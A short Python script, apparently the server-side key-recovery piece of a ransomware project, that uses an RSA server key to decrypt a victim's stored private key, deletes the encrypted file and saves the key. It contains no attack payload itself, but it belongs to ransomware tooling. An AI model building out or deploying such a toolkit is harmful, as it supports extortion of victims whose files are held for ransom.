import rsa
import os

SERVER_PRIVATE_KEY_FILENAME = 's_priv_key.PEM'
VICTIM_ENCRYPTED_FILE = 'DecryptInfo.pass'
SAVEFILE = 'victim_private.PEM'

if __name__=="__main__":
    with open(SERVER_PRIVATE_KEY_FILENAME, 'rb') as serfile:
        priv_key_bytes = serfile.read()
    priv_key = rsa.PrivateKey.load_pkcs1(priv_key_bytes)
    
    #Time to get victim encrypted file
    with open(VICTIM_ENCRYPTED_FILE, 'rb') as victimfile:
        encrypted_bytes = victimfile.read()
    os.remove(VICTIM_ENCRYPTED_FILE)

    decrypted_bytes = rsa.decrypt(encrypted_bytes, priv_key)

    #save to victim_private.PEM file
    with open(SAVEFILE, 'wb') as savefile:
        savefile.write(decrypted_bytes)
